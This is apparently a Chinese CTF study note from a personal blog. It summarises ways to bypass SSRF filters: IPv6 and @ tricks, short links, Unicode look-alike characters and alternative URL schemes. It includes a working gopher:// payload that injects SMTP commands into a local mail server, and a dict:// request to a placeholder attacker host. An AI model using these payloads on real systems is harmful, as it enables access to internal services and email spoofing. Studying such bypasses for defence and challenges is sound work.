---

title: ssrf绕过总结

date: 2021-04-14 23:46:46

tags: 笔记

categories: note7

---
今天群里发了一个关于ssrf绕过总结的文章，想起来做过的ssrf题目也有不少，这次做一个绕过的总结。这里只总结目前还没有见过的绕过方式。  

## 攻击本地  

	http://127.0.0.1:80
	http://localhost:22


1、利用[::]


	利用[::]绕过localhost
	http://[::]:80/  >>>  http://127.0.0.1

2、利用@  

	http://example.com@127.0.0.1  

3、利用短地址

	http://dwz.cn/11SMa  >>>  http://127.0.0.1  

4、利用上传

	也不一定是上传，我也说不清，自己体会 -.-
	修改"type=file"为"type=url"
	比如：
	上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF  

5、利用Enclosed alphanumerics
	
	利用Enclosed alphanumerics
	ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com
	List:
	① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
	⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
	⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
	⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
	Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
	ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
	⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ 
	⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿  
	
	这个确实是少见了。和之前那个unicode编码有相似之处。  

6、利用句号

	127。0。0。1  >>>  127.0.0.1  
	这个算是和上面那个差不多的。  

7、利用特殊地址

	http://0/  

8、利用协议

	Dict://
	dict://<user-auth>@<host>:<port>/d:<word>
	ssrf.php?url=dict://attacker:11111/
	SFTP://
	ssrf.php?url=sftp://example.com:11111/
	TFTP://
	ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET
	LDAP://
	ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
	Gopher://
	ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a  

9、使用组合

	各种绕过进行自由组合即可   

其实绕过方式多种多样，遇到没见过的就多积累，这样才能面对一道题有多种方法。